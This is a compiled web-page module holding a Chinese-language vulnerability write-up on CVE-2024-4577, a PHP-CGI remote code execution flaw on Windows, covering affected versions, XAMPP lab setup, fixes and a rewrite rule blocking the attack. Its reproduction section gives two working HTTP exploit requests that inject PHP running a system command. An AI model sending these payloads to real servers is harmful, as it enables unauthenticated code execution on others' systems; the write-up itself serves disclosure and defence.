import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as l,c as r,a as e,b as i,d as n,e as d}from"./app-58e4a7d6.js";const p={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),o=e("p",null,"PHP 在设计时忽略 Windows 中对字符转换的 Best-Fit 特性，当 PHP 运行在 Window 平台且使用了如下语系（简体中文 936/繁体中文 950/日文 932 等）时，攻击者可构造恶意请求绕过 CVE-2012-1823 保护，从而可在无需登陆的情况下执行任意 PHP 代码。",-1),u=e("p",null,"参考链接：",-1),h={href:"https://ti.qianxin.com/vulnerability/notice-detail/1020?type=risk",target:"_blank",rel:"noopener noreferrer"},v=d(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>主要影响 PHP 在 Windows 操作系统上的安装版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>PHP 8.3 &lt; 8.3.8
PHP 8.2 &lt; 8.2.20
PHP 8.1 &lt; 8.1.29
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>查看 Windows 操作系统默认编码（936 为中文 GBK，65001 为 UTF-8）：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>chcp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><h3 id="场景-1-在-cgi-模式下运行-php" tabindex="-1"><a class="header-anchor" href="#场景-1-在-cgi-模式下运行-php" aria-hidden="true">#</a> 场景 1 - 在 CGI 模式下运行 PHP</h3><p>在配置 Action 指令将相应的 HTTP 请求映射到 Apache HTTP Server 中的 PHP-CGI 可执行二进制文件时，可直接利用此漏洞。受影响的常见配置包括但不限于：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>AddHandler cgi-script .php
Action cgi-script &quot;/cgi-bin/php-cgi.exe&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>或者</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;FilesMatch &quot;\\.php$&quot;&gt;
    SetHandler application/x-httpd-php-cgi
&lt;/FilesMatch&gt;
 
Action application/x-httpd-php-cgi &quot;/php-cgi/php-cgi.exe&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="场景-2-公开-php-二进制文件-默认的-xampp-配置" tabindex="-1"><a class="header-anchor" href="#场景-2-公开-php-二进制文件-默认的-xampp-配置" aria-hidden="true">#</a> 场景 2 - 公开 PHP 二进制文件（默认的 XAMPP 配置）</h3><p>常见场景包括但不限于：</p><ol><li>将 php.exe 或复制 php-cgi.exe 到/cgi-bin/目录。</li><li>通过指令公开 PHP 目录 ScriptAlias，例如，在 XAMPP 默认配置 <code>httpd-xampp.conf</code> 中：</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ScriptAlias /php-cgi/ &quot;C:/xampp/php/&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,15),m={href:"https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/8.1.25/xampp-windows-x64-8.1.25-0-VS16-installer.exe",target:"_blank",rel:"noopener noreferrer"},g=e("code",null,"http://your-ip/dashboard",-1),x=d(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240612153916606.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc1：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
REDIRECT-STATUS:1

&lt;?php system(&quot;dir&quot;);?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240612154037916.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>poc2：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /php-cgi/php-cgi.exe?%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: your-ip
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
REDIRECT-STATUS:1

&lt;?php system(&quot;dir&quot;);?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240612154050322.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><h3 id="安全更新" tabindex="-1"><a class="header-anchor" href="#安全更新" aria-hidden="true">#</a> 安全更新</h3><p>目前官方已有可更新版本，建议受影响用户升级至最新版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>PHP 8.3 &gt;= 8.3.8
PHP 8.2 &gt;= 8.2.20
PHP 8.1 &gt;= 8.1.29
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注：由于 PHP 8.0、PHP 7 和 PHP 5 的分支已终止使用，并且不再维护，服务器管理员可以参考“缓解方案”中的临时补丁建议。</p><p>官方下载地址：</p>`,14),b={href:"https://www.php.net/downloads.php",target:"_blank",rel:"noopener noreferrer"},_=d(`<h3 id="缓解方案" tabindex="-1"><a class="header-anchor" href="#缓解方案" aria-hidden="true">#</a> 缓解方案</h3><h4 id="_1-对于无法升级-php-的用户" tabindex="-1"><a class="header-anchor" href="#_1-对于无法升级-php-的用户" aria-hidden="true">#</a> 1. 对于无法升级 PHP 的用户</h4><p>以下重写规则可用于阻止攻击。需要注意的是，这些规则仅对繁体中文、简体中文和日语语言环境起到临时缓解作用。在实际操作中，仍然建议更新到补丁版本或迁移架构。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>RewriteEngine On
RewriteCond %{QUERY_STRING} ^%ad [NC]
RewriteRule .? - [F,L]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_2-对于使用-xampp-for-windows-的用户" tabindex="-1"><a class="header-anchor" href="#_2-对于使用-xampp-for-windows-的用户" aria-hidden="true">#</a> 2. 对于使用 XAMPP for Windows 的用户</h4><p>如果确认不需要 PHP CGI 功能，可以通过修改以下 Apache HTTP Server 配置来避免受到该漏洞的影响：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>C:/xampp/apache/conf/extra/httpd-xampp.conf
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>找到相应的行：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ScriptAlias /php-cgi/&quot;C:/xampp/php/&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>并将其注释掉：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># ScriptAlias /php-cgi/&quot;C:/xampp/php/&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,11);function P(f,w){const a=s("ExternalLinkIcon");return l(),r("div",null,[c,o,u,e("ul",null,[e("li",null,[e("a",h,[i("https://ti.qianxin.com/vulnerability/notice-detail/1020?type=risk"),n(a)])])]),v,e("p",null,[e("a",m,[i("官网"),n(a)]),i(" 搭建环境，php 版本 8.1.25。启动完成后，访问 "),g,i(" 即可看到 XAMPP 主页：")]),x,e("p",null,[e("a",b,[i("https://www.php.net/downloads.php"),n(a)])]),_])}const A=t(p,[["render",P],["__file","PHP CGI Windows 平台远程代码执行漏洞 CVE-2024-4577.html.vue"]]);export{A as default};
